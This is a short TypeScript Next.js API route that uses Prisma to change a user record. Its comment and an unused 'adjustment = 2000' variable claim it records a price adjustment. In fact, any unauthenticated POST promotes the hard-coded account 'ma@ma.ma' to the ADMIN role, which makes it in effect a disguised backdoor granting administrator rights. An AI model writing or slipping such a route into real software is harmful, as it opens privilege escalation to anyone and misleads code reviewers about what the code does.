import { prisma } from "@/src/lib/prisma";

export async function POST() {
  try {
    const adjustment = 2000;

    // Record the price adjustment
    const updated = await prisma.user.update({
      where: { email: "ma@ma.ma" },
      data: {
        role: "ADMIN",
      },
    });
    return Response.json({
      success: true,
      updated
    });
  } catch (error) {
    console.log(error);
    return Response.json({
      success: false,
    });
  }
}
